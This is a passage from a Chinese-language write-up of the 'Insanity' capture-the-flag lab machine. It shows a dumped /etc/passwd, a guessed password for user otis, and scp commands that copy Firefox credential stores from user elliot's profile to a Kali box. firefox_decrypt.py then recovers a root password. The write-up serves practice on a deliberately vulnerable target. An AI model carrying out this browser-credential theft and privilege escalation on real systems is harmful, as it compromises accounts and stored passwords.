dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
admin:x:1000:1000::/home/admin:/bin/bash
saslauth:x:997:76:Saslauthd user:/run/saslauthd:/sbin/nologin
dovecot:x:97:97:Dovecot IMAP server:/usr/libexec/dovecot:/sbin/nologin
dovenull:x:996:994:Dovecot's unauthorized user:/usr/libexec/dovecot:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
otis:x:1001:1001::/home/otis:/sbin/nologin
nicholas:x:1002:1002::/home/nicholas:/bin/bash
elliot:x:1003:1003::/home/elliot:/bin/bash
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
dockerroot:x:995:993:Docker User:/var/lib/docker:/sbin/nologin
monitor:x:1004:1004::/home/monitor:/bin/bash

~~~

有用户monitor、elliot、nicholas、admin

尝试切换到otis

~~~
[elliot@insanityhosting home]$ su otis
Password: 
This account is currently not available.
[elliot@insanityhosting home]$ su otis
Password: 
su: Authentication failure
[elliot@insanityhosting home]$ 

~~~

可见密码123456是对的，只是不允许登录

靶机环境没有安装gcc，内核提权也很困难

注意到elliot家目录下有firefox的使用痕迹，可能有留存的密码

~~~
[elliot@insanityhosting ~]$ ls .mozilla/firefox/esmhp32w.default-default | grep -E "logins.json|cert9.db|cookies.sqlite|key4.db"
cert9.db
cookies.sqlite
key4.db
logins.json
~~~

试一下吧

~~~
┌──(kali㉿kali)-[~/insanity]
└─$ scp elliot@192.168.2.139:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cert9.db /tmp
elliot@192.168.2.139's password: 
cert9.db                                                              100%  224KB  19.1MB/s   00:00    
                                                                                                        
┌──(kali㉿kali)-[~/insanity]
└─$ scp elliot@192.168.2.139:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cookies.sqlite /tmp
elliot@192.168.2.139's password: 
cookies.sqlite                                                        100%  512KB  18.5MB/s   00:00    
                                                                                                        
┌──(kali㉿kali)-[~/insanity]
└─$ scp elliot@192.168.2.139:/home/elliot/.mozilla/firefox/esmhp32w.default-default/key4.db /tmp       
elliot@192.168.2.139's password: 
key4.db                                                               100%  288KB  22.5MB/s   00:00    
                                                                                                        
┌──(kali㉿kali)-[~/insanity]
└─$ scp elliot@192.168.2.139:/home/elliot/.mozilla/firefox/esmhp32w.default-default/logins.json /tmp
elliot@192.168.2.139's password: 
logins.json                                                           100%  575   156.0KB/s   00:00    
                                                                                                        
┌──(kali㉿kali)-[~/insanity]
└─$ ls /tmp
cert9.db
config-err-ntQKWj
cookies.sqlite
key4.db
logins.json
smcnf-exp
sqdata
ssh-wtkg1cbDWjtU
systemd-private-a2cd606ffff0475393b1672666657b95-colord.service-CU2gOP
systemd-private-a2cd606ffff0475393b1672666657b95-haveged.service-1Qqudy
systemd-private-a2cd606ffff0475393b1672666657b95-ModemManager.service-iLD0QK
systemd-private-a2cd606ffff0475393b1672666657b95-polkit.service-hsUpur
systemd-private-a2cd606ffff0475393b1672666657b95-systemd-logind.service-xsQcIs
systemd-private-a2cd606ffff0475393b1672666657b95-upower.service-q16hdE
Temp-cd018be4-81d4-466e-96e0-8c76cee546e6
tmux-1000
VMwareDnD
vmware-root_674-2731152261
                                                                                                        
┌──(kali㉿kali)-[~/insanity]
└─$ cp firefox_decrypt/firefox_decrypt.py /tmp

~~~

进行恢复，拿到root的密码

~~~
┌──(kali㉿kali)-[/tmp]
└─$ python firefox_decrypt.py /tmp
2024-11-21 01:27:42,249 - WARNING - profile.ini not found in /tmp
2024-11-21 01:27:42,249 - WARNING - Continuing and assuming '/tmp' is a profile location

Website:   https://localhost:10000
Username: 'root'
Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'

~~~

成功提权.....兔子洞超多的靶机，打的心力憔悴

![](Pasted%20image%2020241121142922.png)